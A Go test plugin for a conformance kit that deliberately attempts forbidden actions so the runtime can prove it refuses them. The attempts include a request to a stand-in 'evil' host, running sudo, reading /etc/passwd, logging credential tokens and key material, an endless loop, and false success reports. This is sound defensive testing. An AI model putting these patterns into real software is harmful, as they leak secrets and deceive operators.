// Copyright 2026 Kryptkeeper Authors
//
// SPDX-License-Identifier: Apache-2.0

// Command hostile is a test plugin that tries everything a plugin must not
// do. The conformance kit loads it to prove the runtime refuses each one;
// it is never shipped.
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/bpmforge/kryptkeeper/sdk/delivery-go/abi"
	"github.com/bpmforge/kryptkeeper/sdk/delivery-go/delivery"
)

func init() { delivery.Register(hostile{}) }

func main() {}

type hostile struct{}

// Validate reports, one line per attempt, what the host answered.
func (hostile) Validate(h *delivery.Host, req abi.ValidateRequest) error {
	var report []string
	note := func(name string, err error) {
		if err == nil {
			report = append(report, name+"=allowed")
		} else {
			report = append(report, name+"=refused")
		}
	}
	_, err := h.HTTP(abi.HTTPRequest{Method: "GET", URL: "https://evil.example.net/steal"})
	note("other-host", err)
	_, err = h.HTTP(abi.HTTPRequest{Method: "GET", URL: "http://example.com/plain"})
	note("plain-http", err)
	_, err = h.HTTP(abi.HTTPRequest{Method: "GET", URL: "https://example.com:8443/"})
	note("other-port", err)
	_, err = h.Run("sudo", "id")
	note("exec", err)
	_, err = os.ReadFile("/etc/passwd")
	note("fs", err)
	note("env", envErr())
	h.Logf("token is %s", req.Credential["token"])
	h.Logf("-----BEGIN PRIVATE KEY-----\nMIIEv\n-----END PRIVATE KEY-----")
	fmt.Println("stdout: token", req.Credential["token"])
	return fmt.Errorf("report: %s", strings.Join(report, ","))
}

func envErr() error {
	if len(os.Environ()) > 0 {
		return nil
	}
	return fmt.Errorf("empty")
}

// Push claims success with an outcome outside the vocabulary.
func (hostile) Push(h *delivery.Host, req abi.PushRequest) (abi.PushResult, error) {
	if req.Target["mode"] == "spin" {
		for {
		}
	}
	if req.Target["mode"] == "key" {
		return abi.PushResult{Installed: true, Outcome: abi.OutcomeInstalled, Detail: "got key bytes: " + fmt.Sprint(len(req.KeyPEM))}, nil
	}
	return abi.PushResult{Installed: true, Outcome: "installed_verified", Detail: "trust me"}, nil
}

func (hostile) Rollback(h *delivery.Host, req abi.RollbackRequest) (abi.RollbackResult, error) {
	return abi.RollbackResult{RolledBack: true}, nil
}
